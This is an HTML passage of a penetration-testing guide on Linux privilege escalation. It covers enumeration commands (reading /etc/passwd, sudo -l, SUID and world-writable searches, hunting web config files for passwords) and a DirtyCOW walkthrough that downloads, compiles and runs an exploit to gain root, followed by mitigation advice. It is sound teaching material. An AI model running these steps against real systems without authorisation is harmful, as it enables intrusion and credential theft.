<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>Linux<span class="w"> </span>kernel<span class="w"> </span><span class="m">3</span>.1
</pre></div>
</div>
<p>This search returns 2 new results that match the OS version: <strong>Libfutex</strong> and <strong>Remount FUSE</strong></p>
<a class="reference internal image-reference" href="../../../../../_images/linuxKernel3.1.jpg"><img alt="../../../../../_images/linuxKernel3.1.jpg" class="align-center" src="../../../../../_images/linuxKernel3.1.jpg" style="width: 500px;" /></a>
<p>The search results page shows 13 more entries that match our search, but they can be
discarded because they don’t match the Kernel or operating system version.</p>
</div>
</div></blockquote>
</section>
<section id="users">
<h4><a class="toc-backref" href="#contents" role="doc-backlink">Users</a><a class="headerlink" href="#users" title="Permalink to this heading">¶</a></h4>
<p>The next commands can be used to retrieve information related to system users, active sessions and
the current user.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>passwd</strong></p>
<p>The <strong>passwd file</strong> stores essential user account information required during login. The
passwd file is stored in the <strong>/etc</strong> directory and contains information such as :</p>
<blockquote>
<div><ul class="simple">
<li><p>user ID</p></li>
<li><p>group ID</p></li>
<li><p>home directory</p></li>
<li><p>the path to the command shell.</p></li>
</ul>
</div></blockquote>
<p>An ‘x’ character means that the encrypted password is stored in the /etc/shadow file.</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>cat<span class="w"> </span>/etc/passwd
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image149.png"><img alt="../../../../../_images/image149.png" class="align-center" src="../../../../../_images/image149.png" style="width: 500px;" /></a>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Current User and active session</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>id
<span class="linenos">2</span><span class="w"> </span>who
<span class="linenos">3</span><span class="w"> </span>w
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image150.png"><img alt="../../../../../_images/image150.png" class="align-center" src="../../../../../_images/image150.png" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>Make sure you pay attention to the groups to which the privileged user belongs. One especially
important group is the <strong>sudo (‘Super User Do’) group</strong>. A user that is member of the sudo group is
able to execute commands in the context of the root user without providing the root password.
Depending on the settings in the sudoer file you may only need to enter the password for the current
user or none at all.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>display a list of commands as super.</strong></p>
<p>When the user is part of the sudo group you can display a list of commands that can be
executed as super.</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>sudo<span class="w"> </span>-l
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/sudo-l-root.jpg"><img alt="../../../../../_images/sudo-l-root.jpg" class="align-center" src="../../../../../_images/sudo-l-root.jpg" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>The sudo command on Linux is very configurable. Instead of allowing a limited user to execute all
commands as root, it is possible to limit a user’s sudo privileges to certain commands by
whitelisting them in the /etc/sudoers file.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>The following line in the sudoers file, for instance, will allow the root privileges for a
user called ‘useraccount’ to execute apt-get and shutdown.</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>useraccount<span class="w"> </span><span class="nv">ALL</span><span class="o">=</span>/usr/bin/apt-get,/sbin/shutdown
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/sudo-l-user.jpg"><img alt="../../../../../_images/sudo-l-user.jpg" class="align-center" src="../../../../../_images/sudo-l-user.jpg" style="width: 500px;" /></a>
</div>
</div></blockquote>
</section>
<section id="suid">
<h4><a class="toc-backref" href="#contents" role="doc-backlink">SUID</a><a class="headerlink" href="#suid" title="Permalink to this heading">¶</a></h4>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>Exploring SUID permissions</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>find<span class="w"> </span>/*<span class="w"> </span>-user<span class="w"> </span>root<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-print<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</pre></div>
</div>
</div>
</div></blockquote>
</section>
<section id="networking-information">
<h4><a class="toc-backref" href="#contents" role="doc-backlink">Networking information</a><a class="headerlink" href="#networking-information" title="Permalink to this heading">¶</a></h4>
<p>The following commands retrieve networking information such as the available network adapters and
configuration, routes, active connections and other network related information.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Network adapters</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>ipconfig<span class="w"> </span>-a
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image151.png"><img alt="../../../../../_images/image151.png" class="align-center" src="../../../../../_images/image151.png" style="width: 500px;" /></a>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>print the routing table</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>route
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image152.png"><img alt="../../../../../_images/image152.png" class="align-center" src="../../../../../_images/image152.png" style="width: 500px;" /></a>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>print the active connections to the terminal</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>netstat<span class="w"> </span>-antup
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image153.png"><img alt="../../../../../_images/image153.png" class="align-center" src="../../../../../_images/image153.png" style="width: 500px;" /></a>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>prints the ARP table</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>arp<span class="w"> </span>-e
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image154.png"><img alt="../../../../../_images/image154.png" class="align-center" src="../../../../../_images/image154.png" style="width: 500px;" /></a>
</div>
</div></blockquote>
</section>
<section id="applications-and-services">
<h4><a class="toc-backref" href="#contents" role="doc-backlink">Applications and services</a><a class="headerlink" href="#applications-and-services" title="Permalink to this heading">¶</a></h4>
<p>These commands retrieve information about applications and services.</p>
<p>Knowing which services are running with root privileges can be very important for privilege
escalation because exploiting them will result in root level access.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>ps<span class="w"> </span>aux
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image155.png"><img alt="../../../../../_images/image155.png" class="align-center" src="../../../../../_images/image155.png" style="width: 500px;" /></a>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>retrieve installed applications</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span><span class="c1"># Debian and derivative</span>
<span class="linenos">2</span><span class="w"> </span>dpkg<span class="w"> </span>-l
<span class="linenos">3</span>
<span class="linenos">4</span><span class="w"> </span><span class="c1"># Fedora based distros</span>
<span class="linenos">5</span><span class="w"> </span>rpm<span class="w"> </span>-qa
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image156.png"><img alt="../../../../../_images/image156.png" class="align-center" src="../../../../../_images/image156.png" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>Configurations files may contains sensitive information about applications and services which can
also be very useful information for privilege escalation purposes.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>list configuration files in the /etc directory</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>ls<span class="w"> </span>-ls<span class="w"> </span>/etc/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>.conf
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image157.png"><img alt="../../../../../_images/image157.png" class="align-center" src="../../../../../_images/image157.png" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>Also try searching the web directory for any web application configuration files that contain
passwords.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Search for web directory</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>ls<span class="w"> </span>-ls<span class="w"> </span>/var/www/html/
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/priv-esca-linux-web-dirs.jpg"><img alt="../../../../../_images/priv-esca-linux-web-dirs.jpg" class="align-center" src="../../../../../_images/priv-esca-linux-web-dirs.jpg" style="width: 500px;" /></a>
</div>
<div class="admonition important">
<p class="admonition-title">Important</p>
<p><strong>Hint</strong></p>
<p>Joomla installations contain a configuration file named <strong>‘configuration.php’</strong> and
WordPress uses the ‘wp-config.php’ file for this purpose. These configuration files contain
valuable information such as the MySQL username and password. If you encounter web
applications on a compromised host, be sure to check their configuration files for
information that can be used for privilege escalation. It is very common for web admins to
re-use passwords on other accounts.</p>
</div>
</div></blockquote>
</section>
<section id="files-and-file-systems">
<h4><a class="toc-backref" href="#contents" role="doc-backlink">Files and file systems</a><a class="headerlink" href="#files-and-file-systems" title="Permalink to this heading">¶</a></h4>
<p>Another important thing to look at are files and directories that have world writable permissions.
<strong>Files with world writable permissions can be modified by any user on the system</strong>.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>check for unmounted file systems</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>cat<span class="w"> </span>/etc/fstab
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image159.png"><img alt="../../../../../_images/image159.png" class="align-center" src="../../../../../_images/image159.png" style="width: 500px;" /></a>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>World writable directories</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-wholename<span class="w"> </span><span class="s1">&#39;/home/homedir*&#39;</span><span class="w"> </span>-prune<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-o<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span>-perm<span class="w"> </span>-0002<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-ld<span class="w"> </span><span class="s1">&#39;{}&#39;</span><span class="w"> </span><span class="s1">&#39;;&#39;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span>root
</pre></div>
</div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>World writable directories for root</strong></p>
<blockquote>
<div><div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-wholename<span class="w"> </span><span class="s1">&#39;/home/homedir*&#39;</span><span class="w"> </span>-prune<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-o<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span>-perm<span class="w"> </span>-0002<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-ld<span class="w"> </span><span class="s1">&#39;{}&#39;</span><span class="w"> </span><span class="s1">&#39;;&#39;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>root
</pre></div>
</div>
</div></blockquote>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>World writable files</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-wholename<span class="w"> </span><span class="s1">&#39;/home/homedir/*&#39;</span><span class="w"> </span>-prune<span class="w"> </span>-o<span class="w"> </span>-wholename<span class="w"> </span><span class="s1">&#39;/proc/*&#39;</span><span class="w"> </span>-prune<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-o<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-perm<span class="w"> </span>-0002<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span><span class="s1">&#39;{}&#39;</span><span class="w"> </span><span class="s1">&#39;;&#39;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
</pre></div>
</div>
</div>
</div></blockquote>
<p>These next commands print the search results to the terminal without any additional information.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Find world writable files in /etc</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>find<span class="w"> </span>/etc<span class="w"> </span>-perm<span class="w"> </span>-2<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</pre></div>
</div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>searches for world writable directories</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</pre></div>
</div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Search for binaries with special capabilities</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</pre></div>
</div>
</div>
</div></blockquote>
</section>
</section>
<section id="automated-scripts">
<h3><a class="toc-backref" href="#contents" role="doc-backlink">Automated Scripts</a><a class="headerlink" href="#automated-scripts" title="Permalink to this heading">¶</a></h3>
<p>Instead of manually searching for vulnerabilities and misconfigurations for privilege escalation,
you can also use scripts to automate the process of collecting system information and testing for
vulnerabilities. Some of the scripts even suggest exploits based on the information they find.</p>
<blockquote>
<div><div class="admonition important">
<p class="admonition-title">Important</p>
<p><strong>Remember</strong></p>
<p>It is necessary to transfert or upload those script to the target.</p>
</div>
</div></blockquote>
<p>Here are some scripts to perform an automatic scan to seek for some vulnerability or
mis-configuration witch can lead to Privilege Escalation :</p>
<blockquote>
<div><ul class="simple">
<li><p><a class="reference internal" href="../../../../Toolbox/LinPEAS/LinPEAS.html#ref-linpeas"><span class="std std-ref">LinPEAS</span></a></p></li>
<li><p><a class="reference internal" href="../../../../Toolbox/UnixPrivescCheck/UnixPrivescCheck.html#ref-unixprivesccheck"><span class="std std-ref">Unix-privesc-checker</span></a></p></li>
</ul>
</div></blockquote>
</section>
<section id="limitations-of-automated-scripts">
<h3><a class="toc-backref" href="#contents" role="doc-backlink">Limitations of automated scripts</a><a class="headerlink" href="#limitations-of-automated-scripts" title="Permalink to this heading">¶</a></h3>
<p>Automated vulnerability scanners and scripts usually rely on a database of known vulnerabilities
which is only as valid as the last update. Using outdated vulnerability databases with automated
scanning tools will result in overlooking any recently discovered vulnerabilities.</p>
<p>Another limitation of scripts is that they are generally considered ‘dumb’. They are programmed only
to perform a given series of checks and nothing more. Unless a check is included in the scanning
routine, the script will miss vulnerabilities and misconfigurations that might have otherwise easily
been discovered with manual testing.</p>
<p>There’s also a complexity issue when using automated tools.
Automated tools cannot (yet) draw conclusions in the same way that human experts can. In other
words, in the final analysis, automated scanners and scripts are likely to be less effective and
less insightful than manual testing by an expert.</p>
<p>It’s important, therefore, to realize that automated vulnerability scanning and scripts are
imperfect solutions that merely identify those security issues which have been programmed into them.
However, they can help identify such issues before attackers do (after all, attackers may well be
using those self-same tools).</p>
<p>The privilege escalation scripts are great at finding the low hanging fruit on Linux systems, but
try not to become too reliant on them and make sure you develop your manual testing skills to be
able to provide greater depth in your vulnerability testing.</p>
</section>
</section>
<hr class="docutils" />
<section id="exploiting-the-linux-kernel">
<h2><a class="toc-backref" href="#contents" role="doc-backlink">Exploiting the Linux kernel</a><a class="headerlink" href="#exploiting-the-linux-kernel" title="Permalink to this heading">¶</a></h2>
<p>It is advised to always check the running Linux kernel for vulnerabilities that can be exploited to
perform privilege escalation. Infrequently updated Linux systems are likely to be vulnerable to one
or more kernel privilege escalation exploits.</p>
<p>The following exemple are based on the ‘DirtyCOW’ vulnerability.</p>
<section id="downloading-and-compiling-the-exploit">
<h3><a class="toc-backref" href="#contents" role="doc-backlink">Downloading and compiling the exploit</a><a class="headerlink" href="#downloading-and-compiling-the-exploit" title="Permalink to this heading">¶</a></h3>
<p>Sometimes the target doesn’t have the necessary tools to compile the exploit. In this case, you can
compile the exploit on your own machine and transfer it to the target.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>Downloading the 40616 exploit from Exploit-db :</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>wget<span class="w"> </span>https://www.exploit-db.com/download/40616<span class="w"> </span>-O<span class="w"> </span>cowroot.c
</pre></div>
</div>
</div>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p><strong>Don’t use an exploit without a previous reading</strong></p>
<blockquote>
<div><p>The reading of the exploit will:</p>
<ol class="arabic simple">
<li><p>Allow you to understand the vulnerability and how to
exploit it.</p></li>
<li><p>Gave you some further instruction on how to compile the exploit.</p></li>
<li><p>Ensure you that the exploit have not some malicious code.</p></li>
</ol>
</div></blockquote>
</div>
</div></blockquote>
<p>In this exemple, the first instruction is to comment / uncomment the payload of the architecture of
the target.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<a class="reference internal image-reference" href="../../../../../_images/image164.png"><img alt="../../../../../_images/image164.png" class="align-center" src="../../../../../_images/image164.png" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>Use the ‘uname’ command to get the architecture of the target.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>uname<span class="w"> </span>-a
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image163.png"><img alt="../../../../../_images/image163.png" class="align-center" src="../../../../../_images/image163.png" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>In this case the target is a 32-bit system (i686). The 64-bit payload must be disable and the
32-bit version must be enable.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>Now the exploit must be compiled with GCC</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>gcc<span class="w"> </span>cowroot.c<span class="w"> </span>-o<span class="w"> </span>cowroot<span class="w"> </span>-pthread
</pre></div>
</div>
</div>
<div class="admonition important">
<p class="admonition-title">Important</p>
<p>In some cases, you may get an error related to the GLIB version not found when executing a
locally compiled exploit. You can fix this error by appending the <strong>-static</strong> flag to the
compilation command.</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>gcc<span class="w"> </span>cowroot.c<span class="w"> </span>-o<span class="w"> </span>cowroot<span class="w"> </span>-pthread<span class="w"> </span>-static
</pre></div>
</div>
</div>
</div></blockquote>
<p>If the file ‘cowroot’ was created from the attack machine, it is necessary to upload it to the
target. Most of the time it is a download from the target itself. (cURL, wget, etc.)</p>
<p>Once the exploit is on the target, we need to make it executable.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>cowroot
<span class="linenos">2</span>
<span class="linenos">3</span><span class="w"> </span><span class="c1"># or in binary mode</span>
<span class="linenos">4</span><span class="w"> </span>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>cowroot
</pre></div>
</div>
</div>
</div></blockquote>
</section>
<section id="executing-the-exploit">
<h3><a class="toc-backref" href="#contents" role="doc-backlink">Executing the exploit</a><a class="headerlink" href="#executing-the-exploit" title="Permalink to this heading">¶</a></h3>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>Execute the compiled exploit and wait for it to add a new admin user to the system.</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>./cowroot
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/image168.png"><img alt="../../../../../_images/image168.png" class="align-center" src="../../../../../_images/image168.png" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>The exploit here ran successfully and upgraded our shell to a root shell granting us full control
over the target host.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>The exploit instructions advice running the following command to prevent the system
becoming unstable and crashing:</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>&gt;<span class="w"> </span>/proc/sys/vm/dirty_writeback_centisecs
</pre></div>
</div>
</div>
</div></blockquote>
</section>
</section>
<hr class="docutils" />
<section id="remediation-mitigation">
<h2><a class="toc-backref" href="#contents" role="doc-backlink">Remediation &amp; Mitigation</a><a class="headerlink" href="#remediation-mitigation" title="Permalink to this heading">¶</a></h2>
<p>Despite great deal of effort and a programme of continuous improvement, privilege escalation
vectors for the Linux kernel are still very common and a problem for the Linux community. The best
way to defend against known Linux kernel vulnerabilities is to update the kernel to the latest version on a regular basis.</p>
<p>If we look at a successful exploitation of the DirtyCOW vulnerability, we can distinguish five
requirements:</p>
<blockquote>
<div><ol class="arabic simple">
<li><p>A vulnerable kernel;</p></li>
<li><p>A working exploit;</p></li>
<li><p>A way to transfer the exploit to the target;</p></li>
<li><p>A way to compile the exploit;</p></li>
<li><p>A way to execute the exploit.</p></li>
</ol>
</div></blockquote>
<p>In general, with the exception of point 4, these requirements apply to most kernel attacks. Point 4
is not universally applicable because it is also possible to use a local system which matches the
vulnerable target to compile the exploit. To mitigate kernel attacks, system administrators can
take steps to prevent attackers from transferring, compiling and executing (kernel) exploits. This
will reduce the attack surface significantly and render some ‘easy’ attacks ineffective.</p>
<section id="prevent-transferring-the-exploit">
<h3><a class="toc-backref" href="#contents" role="doc-backlink">Prevent transferring the exploit</a><a class="headerlink" href="#prevent-transferring-the-exploit" title="Permalink to this heading">¶</a></h3>
<p>System administrators can remove any unnecessary tools and disable all services that could be used
to transfer files to the target.</p>
<p>These include:</p>
<blockquote>
<div><ul class="simple">
<li><p>FTP,</p></li>
<li><p>TFTP,</p></li>
<li><p>SMB,</p></li>
<li><p>SCP,</p></li>
<li><p>wget,</p></li>
<li><p>curl</p></li>
</ul>
</div></blockquote>
<p>Instead of removing and disabling such tools or services, another approach could be to restrict
access to them or grant access only for specific accounts (so-called ‘allowlisting’ where only
authorised accounts get access). While not infallible, such restrictions can prevent certain
attacks or create sufficient obstacles to force attackers to use adopting less inconspicuous
methods that are easier to detect. System administrators may also opt to monitor the usage of those
tools for suspicious or malicious activity.</p>
</section>
<section id="remove-compilation-tools">
<h3><a class="toc-backref" href="#contents" role="doc-backlink">Remove compilation tools</a><a class="headerlink" href="#remove-compilation-tools" title="Permalink to this heading">¶</a></h3>
<p>The same applies to compilation tools, such as <strong>GCC, CC</strong> and other development tools. The general
rule for compilation tools (and other tools that can be leveraged for an attack) is that they
should only be installed if and for as long as you need them. If you really need to have
compilation tools on your system, make sure they are only available to specific user accounts. Of
course, this won’t stop attackers from compiling exploits on a similar local system, but in the
previous section we’ve learned how we can try to prevent the attacker from transferring and
executing the compiled exploit to the compromised host.</p>
</section>
<section id="prevent-exploit-execution">
<h3><a class="toc-backref" href="#contents" role="doc-backlink">Prevent exploit execution</a><a class="headerlink" href="#prevent-exploit-execution" title="Permalink to this heading">¶</a></h3>
<p>Finally, we can also prevent attackers from executing (kernel) exploits on a compromised system.
From this perspective, <strong>it is important to limit writable and executable directories for system
users and services</strong>. Specific attention should be paid to world-writable directories, such as the
<strong>/tmp and /dev/shm directories</strong>. By creating separate partitions, we can improve the security of
Linux systems by mounting directories such as /tmp and /home on a separated ‘noexec’ file system.
This means that binaries that are stored on these partitions cannot be executed by any user. This
way we can prevent attackers from executing exploits stored from the /tmp directory.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>To restrict the execution of existing applications for specific users, you can simply set
appropriate permissions on the executable with the chmod command:</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>chmod<span class="w"> </span><span class="m">700</span><span class="w"> </span>/executable/file
</pre></div>
</div>
<p>This will restrict executable file read/write/execute permissions to the owner of the file.</p>
</div>
</div></blockquote>
</section>
</section>
<hr class="docutils" />
<section id="weblinks">
<h2><a class="toc-backref" href="#contents" role="doc-backlink">Weblinks</a><a class="headerlink" href="#weblinks" title="Permalink to this heading">¶</a></h2>
</section>
</section>

</main>
                        <nav aria-label="Page navigation" class="py-4 my-5 clearfix font-weight-bold border-top">
    <a class="float-left" href="../PrivEsc.html" title="Previous">
        <span aria-hidden="true">←&nbsp;</span>Privilege Escalation
    </a>
    <a class="float-right" href="../../PostExploit/PostExploit.html" title="Next">
        Post Exploitation <span aria-hidden="true">&nbsp;→</span>
    </a>
</nav>
                    </div>
                    
                    <nav class="col-12 col-lg-3 pb-4">
                        <div class="sticky-top toc page-toc" aria-labelledby="page-toc-heading">
                            <p class="font-weight-bold" id="page-toc-heading">Page contents</p>
                            <ul>
<li><a class="reference internal" href="#">Privilege escalation - Linux</a><ul>
<li><a class="reference internal" href="#collecting-system-information-manually">Collecting system information manually</a><ul>
<li><a class="reference internal" href="#linux-command-to-get-system-information">Linux command to get system information</a><ul>
<li><a class="reference internal" href="#os-kernel-hostname">OS, Kernel &amp; Hostname</a></li>
<li><a class="reference internal" href="#users">Users</a></li>
<li><a class="reference internal" href="#suid">SUID</a></li>
<li><a class="reference internal" href="#networking-information">Networking information</a></li>
<li><a class="reference internal" href="#applications-and-services">Applications and services</a></li>
<li><a class="reference internal" href="#files-and-file-systems">Files and file systems</a></li>
</ul>
</li>
<li><a class="reference internal" href="#automated-scripts">Automated Scripts</a></li>
<li><a class="reference internal" href="#limitations-of-automated-scripts">Limitations of automated scripts</a></li>
</ul>
</li>
<li><a class="reference internal" href="#exploiting-the-linux-kernel">Exploiting the Linux kernel</a><ul>
<li><a class="reference internal" href="#downloading-and-compiling-the-exploit">Downloading and compiling the exploit</a></li>
<li><a class="reference internal" href="#executing-the-exploit">Executing the exploit</a></li>
</ul>
</li>
<li><a class="reference internal" href="#remediation-mitigation">Remediation &amp; Mitigation</a><ul>
<li><a class="reference internal" href="#prevent-transferring-the-exploit">Prevent transferring the exploit</a></li>
<li><a class="reference internal" href="#remove-compilation-tools">Remove compilation tools</a></li>
<li><a class="reference internal" href="#prevent-exploit-execution">Prevent exploit execution</a></li>
</ul>
</li>
<li><a class="reference internal" href="#weblinks">Weblinks</a></li>
</ul>
</li>
</ul>

                        </div>
                    </nav>
                    
                </div>
            </div>
        </div>
    </div>
    <footer class="container-fluid bg-primary text-light">
        <div class="container">
            <div class="row">
        <div class="col p-4">
            
            <div class="text-center">
                <p style="display: none">
                    <a class="text-light" href="https://github.com/ahdcreative/sphinx_ahd_theme" rel="nofollow" target="_blank">
                        AHDCreative Sphinx Theme 5.3.8
                    </a>
                </p>
            </div>
            <div class="text-center">
                    &copy; Copyright 2023, Poltergeist42
            </div>
        </div>
    </div>
        </div>
    </footer>
        <script data-url_root="../../../../../" id="documentation_options" src="../../../../../_static/documentation_options.js"></script>
        <script src="../../../../../_static/jquery.js"></script>
        <script src="../../../../../_static/underscore.js"></script>
        <script src="../../../../../_static/_sphinx_javascript_frameworks_compat.js"></script>
        <script src="../../../../../_static/doctools.js"></script>
        <script src="../../../../../_static/sphinx_highlight.js"></script>
        <script type="text/javascript" src="../../../../../_static/dist/theme.js"></script>
        <script type="text/javascript" src="../../../../../_static/dist/vendor.js"></script>
        <script type="text/javascript" src="../../../../../_static/searchtools.js"></script>
        <script type="text/javascript" src="../../../../../_static/language_data.js"></script>
        <script type="text/javascript">
            jQuery(function() { Search.loadIndex("../../../../../searchindex.js"); });
        </script>
        <script type="text/javascript" id="searchindexloader"></script>
    </body>
</html>